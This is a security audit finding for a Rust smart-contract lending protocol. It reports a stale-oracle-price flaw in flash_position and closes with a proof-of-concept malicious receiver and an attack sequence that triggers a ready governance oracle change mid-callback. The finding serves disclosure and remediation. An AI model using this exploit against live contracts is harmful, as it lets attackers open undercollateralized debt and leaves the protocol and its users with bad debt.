### Title
Flash-position callback can execute a ready oracle operation while final risk uses stale cached prices - ([File: contracts/controller/src/strategies/flash_position.rs](contracts/controller/src/strategies/flash_position.rs))

### Summary
`flash_position` prefetches oracle prices before calling an attacker-controlled receiver, then retains those prices for the post-callback solvency checks. The receiver can execute a ready governance operation against the price aggregator with `executor = None`, changing the active oracle mid-transaction while the controller continues using the pre-callback price. This can leave an account solvent only under the obsolete valuation, creating undercollateralized debt and eventual bad debt.

### Finding Description
`process_flash_position` calls `prefetch_strategy_prices` at line 117 before minting and forwarding debt and invoking `execute_flash_position` at lines 120–142. After the callback, it deposits measured collateral and calls `strategy_finalize` at line 153 without refreshing the oracle data. [1](#0-0) 

`Context::fetch_prices` deliberately retains already cached prices, and `cached_price` returns that retained value rather than querying the aggregator again. [2](#0-1) 

A flash receiver is not limited to token transfers. It can call `Governance::execute` because governance is a separate contract and `executor = None` performs no executor-role check for a ready operation. [3](#0-2)  Governance then invokes the scheduled target and clears the operation only after execution. [4](#0-3) 

A scheduled `AdminOperation::ConfigureAssetOracle` resolves to price-aggregator `set_oracle`. [5](#0-4)  `set_oracle` validates, probes, stores, and revalidates the replacement oracle, so subsequent aggregator reads use the new configuration. [6](#0-5) 

Thus the effective sequence is:

```text
controller flash_position
  -> Context caches collateral/debt prices
  -> pool mints debt to controller
  -> controller forwards measured debt to receiver
  -> receiver executes ready governance oracle operation
  -> receiver sends declared collateral and returns
  -> controller finalizes risk using the old cached prices
```

This is the same stale-descriptor/interleaving class as the DMA issue: an operation snapshot is installed before external execution, another reachable actor replaces the underlying resource during that execution, and completion logic consumes the stale snapshot.

### Impact Explanation
If the ready operation replaces or reprices an oracle so the collateral’s value falls or the debt’s value rises, the controller still evaluates the final account with the old feed. A position that is undercollateralized under the now-active oracle can therefore pass the final LTV, health-factor, and collateral-floor checks.

The borrowed tokens have already been transferred to the receiver, and unused debt tokens can be returned through `refund_assets`; the debt remains on the account. A sufficiently large repricing leaves the protocol with debt exceeding recoverable collateral, causing liquidation shortfall and socialized bad debt.

### Likelihood Explanation
The attacker cannot choose the oracle change: exploitation requires a governance-approved operation to already be in the `Ready` window and to produce a materially different accepted price. When such an operation exists, any unprivileged caller can execute it with `executor = None`, and a malicious flash receiver can order that execution precisely between the controller’s prefetch and final risk check. The path is reachable with a caller-owned account, a caller-selected WASM receiver, positive `amount`, a positive declared collateral minimum, and the public scheduled-operation arguments.

### Recommendation
Do not reuse pre-callback oracle or market snapshots for final risk decisions after arbitrary receiver execution. After `invoke_receiver` returns, invalidate and refetch every price and market index used by `strategy_finalize`, or rerun a fresh `Context` for the post-callback solvency gate. The same refresh boundary should apply to routed strategy callbacks and any other external call that can reach governance or other mutable pricing state. If refreshing is intentionally avoided for consistency, guard governance execution or defer oracle activation while a controller risk flow is active; a dedicated oracle configuration epoch checked before and after the callback would also detect mid-flow changes.

### Proof of Concept
A malicious receiver can encode the public fields of a ready oracle operation and execute it inside `execute_flash_position`:

```rust
// Executed by contracts/controller/src/strategies/flash_position.rs
pub fn execute_flash_position(
    env: Env,
    initiator: Address,
    account_id: u64,
    asset: Address,
    amount: i128,
    fee: i128,
    amount_received: i128,
    controller: Address,
    data: Bytes,
) {
    let op: StoredReadyOracleOp = read_ready_oracle_op(&env);

    GovernanceClient::new(&env, &op.governance).execute(
        &None,                         // permissionless ready-op execution
        &op.price_aggregator,          // target
        &Symbol::new(&env, "set_oracle"),
        &op.args,                      // Token(collateral), replacement oracle
        &op.predecessor,
        &op.salt,
    );

    TokenClient::new(&env, &op.collateral_asset).transfer(
        &env.current_contract_address(),
        &controller,
        &op.declared_collateral,
    );
}
```

Attack flow:

1. Governance schedules `ConfigureAssetOracle` for collateral token `C`; after the delay, the corresponding aggregator `set_oracle` operation is `Ready`.
2. The attacker calls:

```text
controller.flash_position(
    caller = attacker,
    account_id = attacker_account_or_0,
    spoke_id = spoke,
    mode = Multiply,
    debt = (hub, debt_token),
    amount = borrowed_amount,
    receiver = malicious_receiver,
    data = encoded_ready_operation,
    collaterals = [((hub, collateral_token), minimum)],
    refund_assets = [debt_token],
)
```

3. The controller caches the old collateral and debt prices, mints `borrowed_amount` debt, and forwards the measured proceeds to `malicious_receiver`.
4. The callback executes `governance.execute(None, price_aggregator, "set_oracle", args, predecessor, salt)`.
5. The replacement oracle is stored, but the controller still has the pre-callback `PriceFeedRaw`.
6. The receiver transfers only the declared collateral and returns; unused debt tokens are refunded through `refund_assets`.
7. Finalization sees the obsolete higher collateral value or lower debt value and accepts the account.
8. Under the now-active oracle, the position is unhealthy or undercollateralized. Later liquidation cannot recover the full debt, converting the difference into protocol bad debt.

### Citations

**File:** contracts/controller/src/strategies/flash_position.rs (L117-153)
```rust
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    // Guard both forwarding and the callback: token hooks can reenter first.
    let (amount_received, collateral_before, refund_before) =
        storage::with_flash_guard(env, || {
            let amount_received =
                mint_and_forward(env, &mut account, debt, amount, receiver, &mut cache);
            // Baselines exclude funding and forwarding; count callback receipts only.
            let collateral_before = snapshot_balances(
                env,
                &controller,
                collaterals.iter().map(|(hub_asset, _)| hub_asset.asset),
            );
            let refund_before = snapshot_balances(env, &controller, refund_assets.iter());
            invoke_receiver(
                env,
                receiver,
                caller,
                account_id,
                &debt.asset,
                amount,
                amount_received,
                &controller,
                data,
            );
            (amount_received, collateral_before, refund_before)
        });

    let deposits = collect_collateral_deposits(env, &controller, collaterals, &collateral_before);
    process_deposit(env, &controller, &mut account, &deposits, &mut cache);

    refund_listed_assets(env, caller, refund_assets, &refund_before);

    // Check before and after finalization: its LTV refresh can prune zero-scaled
    // supply, and persistence removes empty accounts.
    require_flash_position_still_open(env, &account, debt);
    strategy_finalize(env, account_id, &mut account, &mut cache);
```

**File:** contracts/controller/src/context.rs (L141-159)
```rust
    /// Fetches missing prices in one aggregator call; retains cached prices.
    pub(crate) fn fetch_prices(&mut self, assets: &Vec<Address>) {
        let missing = collect_uncached_keys(&self.env, assets, &self.token_prices);
        if missing.is_empty() {
            return;
        }
        let fetched = external::price_aggregator::fetch_prices(&self.env, &missing);
        for (asset, feed) in fetched.iter() {
            self.token_prices.set(asset, feed);
        }
    }

    /// Returns a previously loaded price; fails if the cache has no entry.
    pub(crate) fn cached_price(&mut self, asset: &Address) -> PriceFeed {
        let raw = self
            .token_prices
            .get(asset.clone())
            .unwrap_or_else(|| panic_with_error!(&self.env, OracleError::OracleNotConfigured));
        (&raw).into()
```

**File:** contracts/governance/src/api.rs (L53-66)
```rust
    /// Executes a ready, non-expired scheduled op against `target` (not this
    /// contract). If `executor` is `Some`, requires that address to auth and
    /// hold `EXECUTOR_ROLE`; if `None`, no executor role check (anyone may
    /// drive execution of a ready op). Clears scheduled state on success.
    fn execute(
        env: Env,
        executor: Option<Address>,
        target: Address,
        function: Symbol,
        args: Vec<Val>,
        predecessor: BytesN<32>,
        salt: BytesN<32>,
    ) -> Val {
        lifecycle::execute(&env, executor, target, function, args, predecessor, salt)
```

**File:** contracts/governance/src/timelock/lifecycle.rs (L94-109)
```rust
    assert_with_error!(
        env,
        target != env.current_contract_address(),
        GenericError::InternalError
    );
    let operation = Operation {
        target,
        function,
        args,
        predecessor,
        salt,
    };
    let operation_id = prepare_execute(env, executor.as_ref(), &operation);
    let result = execute_operation(env, &operation);
    finish_execute(env, &operation_id);
    result
```

**File:** contracts/governance/src/op.rs (L389-395)
```rust
        AdminOperation::ConfigureAssetOracle(args) => {
            let oracle = resolve_oracle(env, &args.key, &args.oracle);
            price_aggregator_operation(
                env,
                "set_oracle",
                vec![env, args.key.clone().into_val(env), oracle.into_val(env)],
            )
```

**File:** contracts/price-aggregator/src/admin.rs (L76-95)
```rust
pub(crate) fn set_oracle(env: &Env, key: PriceKey, oracle: AssetOracle) {
    if let Some(stored) = registry::get_oracle(env, &key) {
        assert_with_error!(
            env,
            stored.asset_decimals == oracle.asset_decimals,
            OracleError::InvalidOracleDecimals
        );
    }
    validate_asset_oracle(env, &key, &oracle);
    attest_sources(env, &key, &oracle);
    let mut session = Session::new(env);
    if oracle.has_aquarius_lp_source() {
        engine::probe_priceable(&mut session, &key, &oracle);
    } else {
        engine::probe(&mut session, &key, &oracle);
    }

    registry::store_oracle(env, &key, &oracle);
    revalidate_dependents(env, &key);
    registry::emit(env, &key, &oracle);
```
